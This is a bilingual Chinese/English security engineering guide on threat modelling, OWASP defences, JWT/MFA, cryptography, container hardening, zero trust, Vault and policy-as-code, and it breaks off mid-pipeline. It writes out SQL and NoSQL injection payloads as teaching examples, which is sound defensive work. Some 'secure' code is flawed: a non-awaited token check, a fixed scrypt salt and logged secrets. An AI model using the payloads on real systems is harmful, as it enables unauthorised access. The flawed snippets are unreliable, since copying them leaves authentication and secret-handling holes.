# Security 安全工程 - 深度技術指南
# Deep Dive Technical Guide

**版本**: v0.01
**最後更新**: 2025-10-29
**適用對象**: 經驗豐富的安全工程師、安全架構師、DevSecOps 工程師
**建議閱讀**: 先閱讀 SOP_QuickRef.md 和 SOP.md
**文檔類型**: 技術參考、最佳實踐、深度分析

---

## 📚 文檔說明

### 何時閱讀此文檔

✅ **適合閱讀的情況**:
- 設計安全架構和威脅模型
- 實施 DevSecOps 流程
- 處理 OWASP Top 10 漏洞
- 進行安全審計和滲透測試
- 實施零信任架構
- 處理合規要求 (GDPR, SOC2)

❌ **不建議閱讀的情況**:
- 初次實施安全措施(請閱讀 SOP.md)
- 快速參考安全檢查表(請閱讀 SOP_QuickRef.md)
- 基礎密碼學知識

### 文檔結構

```
Part 1: 威脅建模與風險評估
Part 2: OWASP Top 10 深度防禦
Part 3: 認證與授權進階
Part 4: 密碼學實踐
Part 5: 安全開發生命週期 (SDLC)
Part 6: 容器與雲端安全
Part 7: 零信任架構
Part 8: 合規與審計
Part 9: 事件響應
Part 10: 真實案例研究
```

### 相關場景參考

本文檔專注於安全工程，以下相關場景可提供補充視角：

- **[DevOps 持續交付](../devops/SOP_DeepDive.md)** - Part 6 DevSecOps 實踐，將安全整合到 CI/CD pipeline
- **[Testing 測試策略](../testing/SOP_DeepDive.md)** - Part 6 安全性測試 (SAST/DAST) 的完整測試方法
- **[Integration 系統整合](../integration/SOP_DeepDive.md)** - API 安全和第三方整合的安全考量
- **[Greenfield 新專案開發](../greenfield/SOP_DeepDive.md)** - 從專案初期就納入安全設計

---

## Part 1: 威脅建模與風險評估

### 1.1 STRIDE 威脅建模

```yaml
STRIDE 威脅模型:

S - Spoofing (偽裝)
  威脅: 攻擊者冒充合法用戶或系統
  範例: 偽造JWT token, 中間人攻擊
  對策:
    - 強認證 (MFA)
    - 證書驗證
    - HTTPS/TLS

T - Tampering (篡改)
  威脅: 未授權修改資料或代碼
  範例: SQL Injection, 修改請求參數
  對策:
    - 輸入驗證
    - 參數化查詢
    - 完整性檢查 (HMAC, 數位簽章)

R - Repudiation (否認)
  威脅: 用戶否認執行過的操作
  範例: 無法證明誰執行了刪除操作
  對策:
    - 審計日誌
    - 不可否認性 (數位簽章)
    - 操作記錄

I - Information Disclosure (資訊洩露)
  威脅: 未授權訪問敏感資訊
  範例: 資料庫暴露, 錯誤訊息洩露內部結構
  對策:
    - 加密 (傳輸中、靜態)
    - 最小權限原則
    - 安全的錯誤處理

D - Denial of Service (拒絕服務)
  威脅: 使系統無法正常服務
  範例: DDoS 攻擊, 資源耗盡
  對策:
    - 限流
    - CDN/WAF
    - 資源配額

E - Elevation of Privilege (權限提升)
  威脅: 獲得更高權限
  範例: SQL Injection 獲得管理員權限
  對策:
    - RBAC/ABAC
    - 最小權限原則
    - 輸入驗證
```

**威脅建模流程**:

```yaml
1. 識別資產 (Assets):
   - 用戶資料
   - 財務資訊
   - 系統憑證
   - 業務邏輯

2. 繪製資料流圖 (DFD):
   ```
   [User] --HTTPS--> [Load Balancer] ---> [Web Server]
                                            |
                                            v
                                      [App Server] <---> [Database]
                                            |
                                            v
                                      [Redis Cache]
   ```

3. 識別威脅:
   使用 STRIDE 分析每個組件和資料流

4. 評估風險:
   風險 = 可能性 × 影響

   | 威脅 | 可能性 | 影響 | 風險等級 | 對策 |
   |------|--------|------|----------|------|
   | SQL Injection | 高 | 嚴重 | Critical | 參數化查詢 |
   | XSS | 中 | 高 | High | 輸出編碼 |
   | CSRF | 低 | 中 | Medium | CSRF Token |

5. 實施對策:
   - P0 (Critical): 立即修復
   - P1 (High): 本 Sprint 修復
   - P2 (Medium): 下一季度
   - P3 (Low): Backlog
```

---

## Part 2: OWASP Top 10 深度防禦

### 2.1 A01:2021 - Broken Access Control

**漏洞範例**:

```javascript
// ❌ 不安全: 直接使用用戶提供的 ID
app.get('/api/users/:userId/orders', async (req, res) => {
  const orders = await db.orders.find({ userId: req.params.userId });
  res.json(orders);
});

// 攻擊方式:
// GET /api/users/123/orders  (查看其他用戶的訂單)

// ✅ 安全: 驗證權限
app.get('/api/users/:userId/orders', authenticate, async (req, res) => {
  // 確保只能訪問自己的資料
  if (req.user.id !== req.params.userId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const orders = await db.orders.find({ userId: req.params.userId });
  res.json(orders);
});
```

**ABAC (Attribute-Based Access Control) 實作**:

```javascript
class AccessControl {
  constructor() {
    this.policies = [];
  }

  addPolicy(policy) {
    this.policies.push(policy);
  }

  async can(user, action, resource) {
    for (const policy of this.policies) {
      if (await policy.evaluate(user, action, resource)) {
        return true;
      }
    }
    return false;
  }
}

// Policy 定義
class OwnerPolicy {
  async evaluate(user, action, resource) {
    // 擁有者可以執行任何操作
    return resource.ownerId === user.id;
  }
}

class AdminPolicy {
  async evaluate(user, action, resource) {
    // 管理員可以執行任何操作
    return user.role === 'admin';
  }
}

class ReadOnlyPolicy {
  async evaluate(user, action, resource) {
    // 任何人都可以讀取公開資源
    return action === 'read' && resource.isPublic;
  }
}

// 使用
const ac = new AccessControl();
ac.addPolicy(new OwnerPolicy());
ac.addPolicy(new AdminPolicy());
ac.addPolicy(new ReadOnlyPolicy());

app.put('/api/documents/:id', authenticate, async (req, res) => {
  const document = await db.documents.findById(req.params.id);

  if (!await ac.can(req.user, 'update', document)) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  // 執行更新...
});
```

### 2.2 A02:2021 - Cryptographic Failures

**安全的密碼處理**:

```javascript
const bcrypt = require('bcrypt');

// ❌ 不安全: 明文儲存
async function createUser(userData) {
  await db.users.create({
    email: userData.email,
    password: userData.password  // 明文!
  });
}

// ✅ 安全: 使用 bcrypt
async function createUser(userData) {
  const saltRounds = 12;  // 2^12 iterations
  const hashedPassword = await bcrypt.hash(userData.password, saltRounds);

  await db.users.create({
    email: userData.email,
    password: hashedPassword
  });
}

async function verifyPassword(plainPassword, hashedPassword) {
  return await bcrypt.compare(plainPassword, hashedPassword);
}
```

**資料加密**:

```javascript
const crypto = require('crypto');

class Encryption {
  constructor(secretKey) {
    // 使用 256-bit key
    this.key = crypto.scryptSync(secretKey, 'salt', 32);
  }

  encrypt(text) {
    const iv = crypto.randomBytes(16);  // Initialization Vector
    const cipher = crypto.createCipheriv('aes-256-gcm', this.key, iv);

    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');

    const authTag = cipher.getAuthTag();

    // 返回 IV + AuthTag + Encrypted
    return {
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
      encrypted: encrypted
    };
  }

  decrypt(encryptedData) {
    const decipher = crypto.createDecipheriv(
      'aes-256-gcm',
      this.key,
      Buffer.from(encryptedData.iv, 'hex')
    );

    decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));

    let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');

    return decrypted;
  }
}

// 使用
const encryption = new Encryption(process.env.ENCRYPTION_KEY);

// 加密敏感資料
const creditCard = '4111-1111-1111-1111';
const encrypted = encryption.encrypt(creditCard);
await db.users.update({ id: userId }, {
  creditCard: JSON.stringify(encrypted)
});

// 解密
const stored = JSON.parse(user.creditCard);
const decrypted = encryption.decrypt(stored);
```

### 2.3 A03:2021 - Injection

**SQL Injection 防護**:

```javascript
// ❌ 不安全: 字串拼接
async function getUser(email) {
  const query = `SELECT * FROM users WHERE email = '${email}'`;
  return await db.query(query);
}

// 攻擊:
// getUser("' OR '1'='1")
// 產生: SELECT * FROM users WHERE email = '' OR '1'='1'
// 結果: 返回所有用戶!

// ✅ 安全: 參數化查詢
async function getUser(email) {
  const query = 'SELECT * FROM users WHERE email = $1';
  return await db.query(query, [email]);
}

// 或使用 ORM
async function getUser(email) {
  return await User.findOne({ where: { email } });
}
```

**NoSQL Injection 防護**:

```javascript
// ❌ 不安全: 直接使用用戶輸入
async function login(req, res) {
  const { email, password } = req.body;

  const user = await db.users.findOne({
    email: email,
    password: password
  });

  if (user) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
}

// 攻擊:
// POST { "email": "admin@example.com", "password": { "$ne": null } }
// MongoDB 查詢: { email: "admin@example.com", password: { $ne: null } }
// 結果: 繞過密碼檢查!

// ✅ 安全: 驗證輸入類型
async function login(req, res) {
  const { email, password } = req.body;

  // 驗證輸入必須是字串
  if (typeof email !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const user = await db.users.findOne({ email });

  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  res.json({ success: true });
}
```

---

## Part 3: 認證與授權進階

### 3.1 JWT 安全實踐

```javascript
const jwt = require('jsonwebtoken');
const { RateLimiterMemory } = require('rate-limiter-flexible');

// ✅ 安全的 JWT 實作
class JWTService {
  constructor() {
    this.accessTokenSecret = process.env.JWT_ACCESS_SECRET;
    this.refreshTokenSecret = process.env.JWT_REFRESH_SECRET;
    this.blacklist = new Set();  // Token 黑名單

    // 限流器
    this.rateLimiter = new RateLimiterMemory({
      points: 5,  // 5 次嘗試
      duration: 60 * 15,  // 15 分鐘
    });
  }

  // 生成 Access Token (短期)
  generateAccessToken(user) {
    return jwt.sign(
      {
        sub: user.id,
        email: user.email,
        role: user.role,
        type: 'access'
      },
      this.accessTokenSecret,
      {
        expiresIn: '15m',  // 15 分鐘
        issuer: 'myapp',
        audience: 'myapp-api'
      }
    );
  }

  // 生成 Refresh Token (長期)
  generateRefreshToken(user) {
    const jti = crypto.randomUUID();  // 唯一 ID

    return jwt.sign(
      {
        sub: user.id,
        jti: jti,
        type: 'refresh'
      },
      this.refreshTokenSecret,
      {
        expiresIn: '7d',  // 7 天
        issuer: 'myapp',
        audience: 'myapp-api'
      }
    );
  }

  // 驗證 Token
  async verifyAccessToken(token) {
    try {
      // 檢查黑名單
      if (this.blacklist.has(token)) {
        throw new Error('Token revoked');
      }

      // 驗證 Token
      const payload = jwt.verify(token, this.accessTokenSecret, {
        issuer: 'myapp',
        audience: 'myapp-api'
      });

      // 檢查類型
      if (payload.type !== 'access') {
        throw new Error('Invalid token type');
      }

      return payload;
    } catch (err) {
      throw new Error('Invalid token');
    }
  }

  // 刷新 Token
  async refreshAccessToken(refreshToken) {
    try {
      // 限流檢查
      await this.rateLimiter.consume(refreshToken);

      // 驗證 Refresh Token
      const payload = jwt.verify(refreshToken, this.refreshTokenSecret, {
        issuer: 'myapp',
        audience: 'myapp-api'
      });

      if (payload.type !== 'refresh') {
        throw new Error('Invalid token type');
      }

      // 檢查 Token 是否已被使用 (防止重放攻擊)
      const used = await redis.get(`refresh_token:${payload.jti}`);
      if (used) {
        // Token 被重用 - 可能遭到攻擊
        await this.revokeAllUserTokens(payload.sub);
        throw new Error('Token reuse detected');
      }

      // 標記為已使用
      await redis.setex(`refresh_token:${payload.jti}`, 60 * 60 * 24 * 7, 'used');

      // 獲取用戶資料
      const user = await db.users.findById(payload.sub);
      if (!user) {
        throw new Error('User not found');
      }

      // 生成新的 Token 對
      return {
        accessToken: this.generateAccessToken(user),
        refreshToken: this.generateRefreshToken(user)
      };
    } catch (err) {
      throw new Error('Invalid refresh token');
    }
  }

  // 撤銷 Token
  revokeToken(token) {
    this.blacklist.add(token);
  }

  // 撤銷用戶所有 Token
  async revokeAllUserTokens(userId) {
    // 實作: 將用戶所有 active sessions 加入黑名單
  }
}

// Middleware
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.substring(7);

  try {
    const payload = jwtService.verifyAccessToken(token);
    req.user = payload;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
}
```

### 3.2 多因素認證 (MFA)

```javascript
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

class MFAService {
  // 生成 MFA Secret
  async generateSecret(user) {
    const secret = speakeasy.generateSecret({
      name: `MyApp (${user.email})`,
      length: 32
    });

    // 儲存 secret
    await db.users.update(user.id, {
      mfaSecret: secret.base32,
      mfaEnabled: false  // 尚未啟用
    });

    // 生成 QR Code
    const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);

    return {
      secret: secret.base32,
      qrCode: qrCodeUrl
    };
  }

  // 驗證 MFA 代碼
  verifyToken(secret, token) {
    return speakeasy.totp.verify({
      secret: secret,
      encoding: 'base32',
      token: token,
      window: 1  // 允許前後 30 秒的時間差
    });
  }

  // 啟用 MFA
  async enableMFA(user, token) {
    if (!this.verifyToken(user.mfaSecret, token)) {
      throw new Error('Invalid MFA token');
    }

    await db.users.update(user.id, {
      mfaEnabled: true
    });

    // 生成備用代碼
    const backupCodes = this.generateBackupCodes();
    await db.users.update(user.id, {
      mfaBackupCodes: backupCodes.map(code => bcrypt.hashSync(code, 10))
    });

    return backupCodes;
  }

  // 生成備用代碼
  generateBackupCodes(count = 10) {
    const codes = [];
    for (let i = 0; i < count; i++) {
      const code = crypto.randomBytes(4).toString('hex').toUpperCase();
      codes.push(code);
    }
    return codes;
  }
}

// Login flow with MFA
app.post('/api/auth/login', async (req, res) => {
  const { email, password, mfaToken } = req.body;

  // Step 1: 驗證密碼
  const user = await db.users.findOne({ email });
  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Step 2: 檢查是否啟用 MFA
  if (user.mfaEnabled) {
    if (!mfaToken) {
      return res.status(200).json({
        requiresMFA: true,
        message: 'Please provide MFA token'
      });
    }

    // 驗證 MFA token
    if (!mfaService.verifyToken(user.mfaSecret, mfaToken)) {
      return res.status(401).json({ error: 'Invalid MFA token' });
    }
  }

  // Step 3: 生成 JWT
  const accessToken = jwtService.generateAccessToken(user);
  const refreshToken = jwtService.generateRefreshToken(user);

  res.json({
    accessToken,
    refreshToken,
    user: {
      id: user.id,
      email: user.email,
      name: user.name
    }
  });
});
```

---

## Part 4: 密碼學實踐

### 4.1 數位簽章

```javascript
const crypto = require('crypto');

class DigitalSignature {
  constructor() {
    // 生成 RSA 金鑰對
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: {
        type: 'spki',
        format: 'pem'
      },
      privateKeyEncoding: {
        type: 'pkcs8',
        format: 'pem'
      }
    });

    this.publicKey = publicKey;
    this.privateKey = privateKey;
  }

  // 簽署資料
  sign(data) {
    const sign = crypto.createSign('SHA256');
    sign.update(data);
    sign.end();

    const signature = sign.sign(this.privateKey, 'hex');
    return signature;
  }

  // 驗證簽章
  verify(data, signature) {
    const verify = crypto.createVerify('SHA256');
    verify.update(data);
    verify.end();

    return verify.verify(this.publicKey, signature, 'hex');
  }
}

// 使用範例: API 請求簽章
const signer = new DigitalSignature();

// Client side: 簽署請求
function makeSignedRequest(data) {
  const timestamp = Date.now();
  const payload = JSON.stringify({ ...data, timestamp });

  const signature = signer.sign(payload);

  return fetch('/api/endpoint', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Signature': signature,
      'X-Timestamp': timestamp
    },
    body: payload
  });
}

// Server side: 驗證簽章
app.post('/api/endpoint', (req, res) => {
  const signature = req.headers['x-signature'];
  const timestamp = req.headers['x-timestamp'];

  // 檢查時間戳 (防止重放攻擊)
  if (Date.now() - timestamp > 5 * 60 * 1000) {  // 5 分鐘
    return res.status(401).json({ error: 'Request expired' });
  }

  // 驗證簽章
  const payload = JSON.stringify({ ...req.body, timestamp });
  if (!signer.verify(payload, signature)) {
    return res.status(401).json({ error: 'Invalid signature' });
  }

  // 處理請求...
});
```

---

## Part 5: 容器與雲端安全

### 5.1 Docker 安全最佳實踐

```dockerfile
# ===== 安全的 Dockerfile =====

# 1. 使用官方最小化基礎映像
FROM node:18-alpine AS base

# 2. 建立非 root 使用者
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001

# 3. 設定工作目錄
WORKDIR /app

# 4. 只複製必要檔案
COPY --chown=nodejs:nodejs package*.json ./

# 5. 安裝依賴 (生產環境)
RUN npm ci --only=production && \
    npm cache clean --force

# 6. 複製應用程式碼
COPY --chown=nodejs:nodejs . .

# 7. 掃描漏洞
RUN npm audit --audit-level=high

# 8. 切換到非 root 使用者
USER nodejs

# 9. 不暴露非必要端口
EXPOSE 3000

# 10. 使用 HEALTHCHECK
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node healthcheck.js || exit 1

# 11. 使用 exec 格式(而非 shell 格式)
CMD ["node", "index.js"]
```

**Kubernetes Security Context**:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  template:
    spec:
      # Pod Security Context
      securityContext:
        runAsNonRoot: true
        runAsUser: 1001
        fsGroup: 1001
        seccompProfile:
          type: RuntimeDefault

      containers:
        - name: myapp
          image: myapp:latest

          # Container Security Context
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            runAsNonRoot: true
            runAsUser: 1001
            capabilities:
              drop:
                - ALL

          # 資源限制
          resources:
            limits:
              memory: "512Mi"
              cpu: "500m"
            requests:
              memory: "256Mi"
              cpu: "250m"

          # 只掛載必要的 volumes
          volumeMounts:
            - name: tmp
              mountPath: /tmp
            - name: cache
              mountPath: /.cache

      volumes:
        - name: tmp
          emptyDir: {}
        - name: cache
          emptyDir: {}

      # 自動掛載服務帳號 token (如不需要則禁用)
      automountServiceAccountToken: false
```

---

## Part 6: 零信任架構

### 6.1 零信任原則

```yaml
零信任核心原則:

1. 永不信任,始終驗證
   - 每個請求都需要認證和授權
   - 不因網路位置給予信任

2. 最小權限存取
   - Just-In-Time (JIT) access
   - Just-Enough-Access (JEA)

3. 假設入侵
   - 微分段 (Micro-segmentation)
   - 持續監控和日誌記錄

4. 明確驗證
   - 多因素認證
   - 裝置健康檢查
   - 位置和行為分析
```

**實作範例**:

```javascript
class ZeroTrustGateway {
  async authorize(request) {
    // 1. 驗證身份
    const identity = await this.verifyIdentity(request);
    if (!identity) {
      throw new UnauthorizedError('Invalid identity');
    }

    // 2. 檢查裝置健康狀態
    const deviceHealth = await this.checkDeviceHealth(request);
    if (!deviceHealth.compliant) {
      throw new ForbiddenError('Device not compliant');
    }

    // 3. 分析行為異常
    const riskScore = await this.analyzeRisk(identity, request);
    if (riskScore > 0.7) {
      // 要求額外驗證
      await this.requireStepUpAuth(identity);
    }

    // 4. 檢查資源權限
    const resource = this.parseResource(request);
    const authorized = await this.checkPermission(
      identity,
      request.method,
      resource
    );

    if (!authorized) {
      throw new ForbiddenError('Insufficient permissions');
    }

    // 5. 記錄審計日誌
    await this.auditLog({
      identity: identity.id,
      resource: resource,
      action: request.method,
      timestamp: new Date(),
      riskScore: riskScore
    });

    return true;
  }

  async analyzeRisk(identity, request) {
    let riskScore = 0;

    // 異常時間登入
    if (this.isUnusualTime(request.timestamp)) {
      riskScore += 0.2;
    }

    // 異常位置
    if (await this.isUnusualLocation(identity, request.ip)) {
      riskScore += 0.3;
    }

    // 異常行為
    if (await this.isUnusualBehavior(identity, request)) {
      riskScore += 0.4;
    }

    return riskScore;
  }
}
```

---

## Part 7: Secrets 管理與 Vault

### 7.1 Secrets 管理挑戰

```yaml
常見的 Secrets 洩露途徑:

1. 硬編碼在代碼中
   ❌ const API_KEY = "sk_live_abc123..."

2. 提交到版本控制
   ❌ .env 檔案被 commit 到 Git

3. 日誌中洩露
   ❌ console.log('API Response:', secretData)

4. 環境變數暴露
   ❌ 在容器中以明文傳遞

5. 第三方服務洩露
   ❌ Secrets 傳遞給未加密的外部服務
```

### 7.2 HashiCorp Vault 實作

**Vault 安裝與初始化**:

```bash
# 使用 Docker 運行 Vault
docker run --cap-add=IPC_LOCK \
  -e 'VAULT_DEV_ROOT_TOKEN_ID=myroot' \
  -p 8200:8200 \
  vault:latest

# 初始化 Vault
export VAULT_ADDR='http://127.0.0.1:8200'
export VAULT_TOKEN='myroot'

# 啟用 KV secrets engine
vault secrets enable -path=secret kv-v2

# 啟用 AppRole 認證
vault auth enable approle
```

**Node.js 整合 Vault**:

```javascript
const vault = require('node-vault');

class VaultSecretManager {
  constructor() {
    this.client = vault({
      apiVersion: 'v1',
      endpoint: process.env.VAULT_ADDR,
      token: process.env.VAULT_TOKEN
    });
  }

  // 使用 AppRole 認證
  async authenticateWithAppRole(roleId, secretId) {
    const result = await this.client.approleLogin({
      role_id: roleId,
      secret_id: secretId
    });

    // 更新 token
    this.client.token = result.auth.client_token;
    return result.auth;
  }

  // 讀取 Secret
  async getSecret(path) {
    try {
      const result = await this.client.read(`secret/data/${path}`);
      return result.data.data;
    } catch (err) {
      console.error(`Failed to read secret: ${path}`, err);
      throw err;
    }
  }

  // 寫入 Secret
  async setSecret(path, data) {
    await this.client.write(`secret/data/${path}`, {
      data: data
    });
  }

  // 動態生成資料庫憑證
  async getDatabaseCredentials(dbName) {
    const result = await this.client.read(`database/creds/${dbName}`);
    return {
      username: result.data.username,
      password: result.data.password,
      leaseId: result.lease_id,
      leaseDuration: result.lease_duration
    };
  }

  // 續租憑證
  async renewLease(leaseId) {
    await this.client.write('sys/leases/renew', {
      lease_id: leaseId,
      increment: 3600  // 續租 1 小時
    });
  }

  // 撤銷憑證
  async revokeLease(leaseId) {
    await this.client.write('sys/leases/revoke', {
      lease_id: leaseId
    });
  }
}

// 使用範例
const vaultManager = new VaultSecretManager();

// AppRole 認證
await vaultManager.authenticateWithAppRole(
  process.env.VAULT_ROLE_ID,
  process.env.VAULT_SECRET_ID
);

// 獲取應用程式 Secrets
const appSecrets = await vaultManager.getSecret('myapp/config');
console.log('Database URL:', appSecrets.database_url);
console.log('API Key:', appSecrets.api_key);

// 動態資料庫憑證
const dbCreds = await vaultManager.getDatabaseCredentials('postgres');
const db = new Database({
  host: 'localhost',
  port: 5432,
  username: dbCreds.username,
  password: dbCreds.password
});

// 在憑證即將過期前續租
setTimeout(async () => {
  await vaultManager.renewLease(dbCreds.leaseId);
}, (dbCreds.leaseDuration - 300) * 1000);  // 提前 5 分鐘續租
```

### 7.3 Kubernetes Secrets 管理

**使用 External Secrets Operator**:

```yaml
# external-secret.yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: myapp-secrets
  namespace: production
spec:
  refreshInterval: 1h  # 每小時同步一次

  secretStoreRef:
    name: vault-backend
    kind: SecretStore

  target:
    name: myapp-secrets  # 生成的 K8s Secret 名稱
    creationPolicy: Owner

  data:
    - secretKey: database-url
      remoteRef:
        key: secret/data/myapp/config
        property: database_url

    - secretKey: api-key
      remoteRef:
        key: secret/data/myapp/config
        property: api_key

---
# secret-store.yaml
apiVersion: external-secrets.io/v1beta1
kind: SecretStore
metadata:
  name: vault-backend
  namespace: production
spec:
  provider:
    vault:
      server: "http://vault.vault-system:8200"
      path: "secret"
      version: "v2"
      auth:
        kubernetes:
          mountPath: "kubernetes"
          role: "myapp-role"
```

**Pod 使用 Secrets**:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  template:
    spec:
      containers:
        - name: myapp
          image: myapp:latest

          # 方式 1: 環境變數
          env:
            - name: DATABASE_URL
              valueFrom:
                secretKeyRef:
                  name: myapp-secrets
                  key: database-url

            - name: API_KEY
              valueFrom:
                secretKeyRef:
                  name: myapp-secrets
                  key: api-key

          # 方式 2: Volume Mount (更安全)
          volumeMounts:
            - name: secrets
              mountPath: /etc/secrets
              readOnly: true

      volumes:
        - name: secrets
          secret:
            secretName: myapp-secrets
            defaultMode: 0400  # 只讀權限
```

### 7.4 Secrets 輪換 (Rotation)

```javascript
class SecretRotationService {
  constructor(vaultManager, k8sClient) {
    this.vault = vaultManager;
    this.k8s = k8sClient;
    this.rotationInterval = 30 * 24 * 60 * 60 * 1000;  // 30 天
  }

  // 輪換 API Key
  async rotateApiKey(serviceName) {
    console.log(`Rotating API key for ${serviceName}...`);

    // 1. 生成新 API Key
    const newApiKey = crypto.randomBytes(32).toString('hex');

    // 2. 儲存到 Vault
    await this.vault.setSecret(`${serviceName}/config`, {
      api_key: newApiKey,
      rotated_at: new Date().toISOString()
    });

    // 3. 更新 Kubernetes Secret
    await this.k8s.updateSecret(`${serviceName}-secrets`, {
      'api-key': Buffer.from(newApiKey).toString('base64')
    });

    // 4. 通知服務重新載入
    await this.notifyServiceReload(serviceName);

    // 5. 記錄審計日誌
    await this.auditLog({
      action: 'secret_rotation',
      service: serviceName,
      timestamp: new Date()
    });

    console.log(`✅ API key rotated for ${serviceName}`);
  }

  // 輪換資料庫密碼
  async rotateDbPassword(dbName) {
    console.log(`Rotating database password for ${dbName}...`);

    // 1. 生成新密碼
    const newPassword = this.generateSecurePassword(32);

    // 2. 在資料庫中建立新用戶 (或更新密碼)
    await this.updateDatabasePassword(dbName, newPassword);

    // 3. 更新 Vault
    await this.vault.setSecret(`database/${dbName}`, {
      password: newPassword,
      rotated_at: new Date().toISOString()
    });

    // 4. Graceful reload: 保留舊密碼一段時間
    setTimeout(async () => {
      await this.revokeOldPassword(dbName);
    }, 5 * 60 * 1000);  // 5 分鐘後撤銷舊密碼

    console.log(`✅ Database password rotated for ${dbName}`);
  }

  generateSecurePassword(length) {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
    let password = '';
    const randomBytes = crypto.randomBytes(length);

    for (let i = 0; i < length; i++) {
      password += charset[randomBytes[i] % charset.length];
    }

    return password;
  }

  // 自動輪換排程
  scheduleRotation() {
    setInterval(async () => {
      const services = await this.getServicesRequiringRotation();

      for (const service of services) {
        try {
          await this.rotateApiKey(service);
        } catch (err) {
          console.error(`Failed to rotate ${service}:`, err);
          await this.alertOncall(`Secret rotation failed: ${service}`);
        }
      }
    }, 24 * 60 * 60 * 1000);  // 每天檢查一次
  }
}
```

---

## Part 8: Security as Code 與自動化

### 8.1 Infrastructure as Code 安全掃描

**Terraform 安全掃描 (tfsec)**:

```bash
# 安裝 tfsec
brew install tfsec

# 掃描 Terraform 代碼
tfsec .

# 輸出 JSON 報告
tfsec . --format json --out security-report.json

# 設定嚴重度門檻
tfsec . --minimum-severity HIGH
```

**Terraform 安全規則範例**:

```hcl
# ❌ 不安全: S3 bucket 公開讀取
resource "aws_s3_bucket" "example" {
  bucket = "my-bucket"
  acl    = "public-read"  # tfsec 會警告
}

# ✅ 安全: 私有 bucket
resource "aws_s3_bucket" "example" {
  bucket = "my-bucket"
  acl    = "private"
}

resource "aws_s3_bucket_public_access_block" "example" {
  bucket = aws_s3_bucket.example.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# ❌ 不安全: 未加密的 RDS
resource "aws_db_instance" "example" {
  allocated_storage = 20
  engine            = "postgres"
  storage_encrypted = false  # tfsec 會警告
}

# ✅ 安全: 啟用加密
resource "aws_db_instance" "example" {
  allocated_storage = 20
  engine            = "postgres"
  storage_encrypted = true
  kms_key_id        = aws_kms_key.example.arn
}
```

### 8.2 Policy as Code (OPA)

**Open Policy Agent (OPA) 實作**:

```rego
# policy.rego - Kubernetes 准入控制策略

package kubernetes.admission

# 拒絕以 root 運行的容器
deny[msg] {
  input.request.kind.kind == "Pod"
  container := input.request.object.spec.containers[_]
  not container.securityContext.runAsNonRoot

  msg := sprintf("Container '%s' must not run as root", [container.name])
}

# 拒絕沒有資源限制的 Pod
deny[msg] {
  input.request.kind.kind == "Pod"
  container := input.request.object.spec.containers[_]
  not container.resources.limits.memory

  msg := sprintf("Container '%s' must have memory limit", [container.name])
}

# 拒絕使用 latest tag
deny[msg] {
  input.request.kind.kind == "Pod"
  container := input.request.object.spec.containers[_]
  endswith(container.image, ":latest")

  msg := sprintf("Container '%s' must not use :latest tag", [container.name])
}

# 要求特定命名空間使用特定 registry
deny[msg] {
  input.request.kind.kind == "Pod"
  input.request.namespace == "production"
  container := input.request.object.spec.containers[_]
  not startswith(container.image, "registry.company.com/")

  msg := sprintf("Container '%s' must use internal registry in production", [container.name])
}
```

**整合 OPA 到 Kubernetes**:

```yaml
# opa-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: opa
  namespace: opa-system
spec:
  replicas: 2
  selector:
    matchLabels:
      app: opa
  template:
    metadata:
      labels:
        app: opa
    spec:
      containers:
        - name: opa
          image: openpolicyagent/opa:latest
          args:
            - "run"
            - "--server"
            - "--addr=0.0.0.0:8181"
            - "/policies"
          volumeMounts:
            - name: policies
              mountPath: /policies
      volumes:
        - name: policies
          configMap:
            name: opa-policies

---
# validating-webhook.yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: opa-validating-webhook
webhooks:
  - name: validating-webhook.openpolicyagent.org
    clientConfig:
      service:
        name: opa
        namespace: opa-system
        path: "/v1/admit"
      caBundle: <base64-encoded-ca-cert>
    rules:
      - operations: ["CREATE", "UPDATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["pods"]
    admissionReviewVersions: ["v1"]
    sideEffects: None
```

### 8.3 GitOps 安全工作流

**安全的 CI/CD Pipeline**:

```yaml
# .github/workflows/security-pipeline.yml
name: Security Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  # 1. Secrets 掃描
  secret-scanning:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0  # 掃描完整歷史

      - name: Run Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  # 2. 依賴漏洞掃描
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
